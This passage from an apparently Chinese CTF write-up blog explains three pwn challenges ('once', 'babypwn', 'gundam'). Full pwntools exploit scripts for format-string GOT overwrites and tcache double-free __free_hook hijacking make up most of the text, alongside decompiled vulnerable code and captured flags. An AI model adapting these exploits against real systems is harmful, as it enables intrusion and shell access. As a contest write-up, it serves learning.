class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./once'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x08048e48 : add esp, 0x1c ; ret</span></span><br></pre></td></tr></table></figure><h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><p>此题题目给出的提示就是盲pwn ，通过测试可以明显分析出漏洞是格式化字符串，并且偏移是6。并且程序是64位程序，所以编写泄露脚本来dump脚本就可以了。</p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p>这一点坑了好久一直不懂为啥每次dump输出出来的内容都不对，最后dump出来后修改了几个字节读出了程序的正常逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+0h] [bp-110h]@2</span></span><br><span class="line">  __int64 v4; <span class="comment">// [sp+108h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = v28;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    gets((__int64)&amp;format, <span class="number">0L</span>L);</span><br><span class="line">    usleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了binary文件就比较简单了，通过got表可以泄露出题中给出的setbuf、gets、usleep函数地址，其中printf@got不可用，因为地址是0x6010<strong>20</strong> ，利用libc-database得到程序的libc。</p><p>最终通过修改gets@got为system及linux的并行命令拿到shell，64位的程序格式化字符串需要注意的坑点是哟啊先写字符串再加地址，否则是有截断的。</p><p><strong>EXP</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding:utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">#HITB&#123;Baby_Pwn_BabY_bl1nd&#125;</span><br><span class="line"></span><br><span class="line">#context(arch='i386',os='linux',endian='little')</span><br><span class="line">now = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process('./easy_pwn')</span><br><span class="line">libc = ELF('libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">#context.kernel = 'amd64'</span><br><span class="line"><span class="meta">#off = 0x001b2000</span></span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">#gdb.attach(p,'vmmap')</span><br><span class="line">gdb.attach(p,'b *0x804882b')</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote('47.75.182.113', 9999)</span><br><span class="line">libc = ELF('libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">#libc = ELF('./libc-2.23.so')</span><br><span class="line"><span class="meta">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">def leak(str,output,addr):</span><br><span class="line">global now,count </span><br><span class="line">#p.recvuntil('Username:')</span><br><span class="line"><span class="meta">#p.sendline(str)</span></span><br><span class="line">#p.recvuntil('Hello ')</span><br><span class="line">#if('Password')</span><br><span class="line">#tmp = p.recvuntil('p4nda')#recvuntil('p1e')</span><br><span class="line"><span class="meta">#a = tmp[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (tmp[0] == <span class="meta-string">'p'</span>) &amp; (tmp[1] == <span class="meta-string">'1'</span>)&amp; (tmp[2] == <span class="meta-string">'e'</span>):</span></span><br><span class="line"><span class="meta">#a = <span class="meta-string">'\0'</span></span></span><br><span class="line"><span class="meta">#print (a)</span></span><br><span class="line">#p = remote('47.75.182.113', 9999)</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil('&lt;&lt;&lt;&lt;')</span><br><span class="line">tmp = p.recvuntil('&gt;&gt;&gt;&gt;')</span><br><span class="line"><span class="meta">#print tmp</span></span><br><span class="line">if tmp.startswith('&gt;&gt;&gt;&gt;'):</span><br><span class="line">a = <span class="string">'\0'</span></span><br><span class="line">now += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> addr&amp;<span class="number">0xff</span> == <span class="number">0x0a</span>:</span><br><span class="line">#print '[-] error'</span><br><span class="line"><span class="meta">#exit(0)</span></span><br><span class="line">count +=<span class="number">1</span></span><br><span class="line">now += <span class="number">1</span></span><br><span class="line">a = '\xf0'</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = tmp.split('&gt;&gt;&gt;&gt;')[0]</span><br><span class="line">now += len(a)</span><br><span class="line">print a </span><br><span class="line">output.write(a)</span><br><span class="line">#p.close()</span><br><span class="line"></span><br><span class="line">#p.sendline('')</span><br><span class="line"></span><br><span class="line">def find_offset():</span><br><span class="line">for i in range(1,20):</span><br><span class="line">str = '%%%d$x'%(i)</span><br><span class="line">print '[%d]'%i</span><br><span class="line">leak(str)</span><br><span class="line"></span><br><span class="line">def ori_file(str,output):</span><br><span class="line">p.recvuntil('Username:')</span><br><span class="line">p.sendline(str)</span><br><span class="line">#p.recvuntil('p4nda')</span><br><span class="line">p.recvuntil('Hello ')</span><br><span class="line">a = p.recv(<span class="number">1</span>)</span><br><span class="line">print hex(<span class="keyword">int</span>(a)),</span><br><span class="line"></span><br><span class="line">output.write(a)</span><br><span class="line">p.recvuntil('Password')</span><br><span class="line">p.sendline('')</span><br><span class="line">def find_ori():</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">output = open('bin', 'wb')</span><br><span class="line">pro = log.progress('ori_geting')</span><br><span class="line">end = <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">while</span> now &lt; end:</span><br><span class="line">pro.status('recover:'+hex(0x400000+now))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+now)</span><br><span class="line">leak(str,output,<span class="number">0x400000</span>+now)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,0x1000):</span><br><span class="line">#find_offset()</span><br><span class="line">pro.status('recover:'+hex(0x400000+i))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+i)  #'%7$s'+'p1e'+'\0'+p64(0x400000+i)+'\np4nda\0\0\0'# + p32(0x8048970)</span><br><span class="line">leak(str,output,<span class="number">0x400000</span>+i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,0x2000):</span><br><span class="line">#find_offset()</span><br><span class="line">pro.status('recover:'+hex(0x600000+i))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x600000+i)# + p32(0x8048970)</span><br><span class="line">#str = '%7$s'+'p1e'+'\0'+p64(0x600000+i)+'\np4nda\0\0\0'# + p32(0x8048970)</span><br><span class="line">leak(str,output,<span class="number">0x600000</span>+i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pro.success('get ori_file')</span><br><span class="line">output.close()</span><br><span class="line">#find_ori()</span><br><span class="line">def test():</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = raw_input()</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(int(a,16)) + '\n'# + p32(0x8048970) + </span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil('&lt;&lt;&lt;&lt;')</span><br><span class="line">tmp = p.recvuntil('&gt;&gt;&gt;&gt;')</span><br><span class="line">print tmp</span><br><span class="line">if tmp.startswith('&gt;&gt;&gt;&gt;'):</span><br><span class="line">a = <span class="string">'\0'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = tmp[<span class="number">0</span>]</span><br><span class="line">print a</span><br><span class="line">#test()</span><br><span class="line">#str = '%7$s'+'p1e'+'\0'+p64(0x40070b)</span><br><span class="line"><span class="meta">#p.sendline(str)</span></span><br><span class="line"><span class="meta">#def find_password():</span></span><br><span class="line"></span><br><span class="line">#str = '%14$s'+'\0'*2+'p4nda'+p32(0x804A08C)</span><br><span class="line">#find_password(str)</span><br><span class="line"><span class="meta">#i+=1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,100):</span><br><span class="line">str = '%13$caaa' + p32(0x8040000+i*4)  </span><br><span class="line">leak(str)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">#print '[-] count ',count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601018) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak1 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601030) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601028) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak3 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">print '[*] setbuf ',hex(leak1)</span><br><span class="line">print '[*] usleep ',hex(leak2)</span><br><span class="line">print '[*] gets   ',hex(leak3)</span><br><span class="line">libc.address = leak1 - libc.symbols['setbuf']</span><br><span class="line">print '[*] system ',hex(libc.symbols['system'])</span><br><span class="line">context.clear(arch = 'amd64')</span><br><span class="line">#str = repr(fmtstr_payload(7, &#123;0x601028: libc.symbols['system']-8 &#125;, write_size='byte'))</span><br><span class="line">target = libc.symbols['system']</span><br><span class="line">#str1 = <span class="string">"%%%dc%%12$hhn%%%dc%%13$hn"</span>%((target&amp;<span class="number">0xff</span>),(target&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>-(target&amp;<span class="number">0xff</span>)) </span><br><span class="line"></span><br><span class="line">str1 = <span class="string">"%%%dc%%12$hhn%%%dc%%13$hn"</span>%(((target&amp;<span class="number">0xff</span>)),(target&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>-(target&amp;<span class="number">0xff</span>)) </span><br><span class="line">str1 += ';/bin/sh\0;'</span><br><span class="line">str1 = str1.ljust(<span class="number">48</span>,<span class="string">'a'</span>)</span><br><span class="line">str1 += p64(<span class="number">0x601028</span>)</span><br><span class="line">str1 += p64(<span class="number">0x601029</span>)</span><br><span class="line">print '[+] ',len(str1)</span><br><span class="line">#'/bin/sh;' + p64(0x601028) + p64(0x601029) + p64(0x601030) + "%%%dc%%7$p"%((target &amp; 0xff) - 7) </span><br><span class="line">if ('\x20' in str1) | ('\x0a' in str1):</span><br><span class="line">print '[-]'</span><br><span class="line">print str1</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">print str1</span><br><span class="line">p.sendline(str1)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">[*] setbuf  <span class="number">0x7fdcfdb2e6b0</span></span><br><span class="line">[*] usleep  <span class="number">0x7fdcfdbb5d60</span></span><br><span class="line">[*] gets    <span class="number">0x7fdcfdb26d80</span></span><br><span class="line">[*] system  <span class="number">0x7fdcfdafd390</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="gundam"><a href="#gundam" class="headerlink" title="gundam"></a>gundam</h1><p>此题是一道比较明显漏洞的题目，漏洞在destroy函数中，一个double free漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@5</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx@8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-Ch]@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !bss_sum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No gundam"</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which gundam do you want to Destory:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">8</span> &amp;&amp; bss_list[(<span class="keyword">unsigned</span> __int64)v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)bss_list[(<span class="keyword">unsigned</span> __int64)v2] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(bss_list[(<span class="keyword">unsigned</span> __int64)v2] + <span class="number">8L</span>L));</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">LABEL_8:</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他不同的是本题使用的libc是libc 2.26版本，此版本及以后，加入了tcache功能，这个功能我在<a href="http://p4nda.top/2018/03/20/tcache/">之前的博客</a> 中分析过，加入这个功能会降低堆块利用的难度，只是地址泄露的时候有一定差别。</p><p>堆块会优先填充tcache并先从tcache中拿走，在从tcache中拿走的过程中并没有检查size，放入的过程中没有检查double free，因此存在double free可以劫持tcache，造成任意地址写。</p><p> 此题选择覆写__free_hook为system，最终free拿到shell。</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="comment">#HITB&#123;now_you_know_about_tcache&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./gundam'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.37.114'</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name,type)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'The name of gundam :'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">'The type of the gundam :'</span>)</span><br><span class="line">p.sendline(str(type))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Which gundam do you want to Destory:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">destroy(i)</span><br><span class="line">blow()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'Gundam[7] :aaaaaaaa'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span 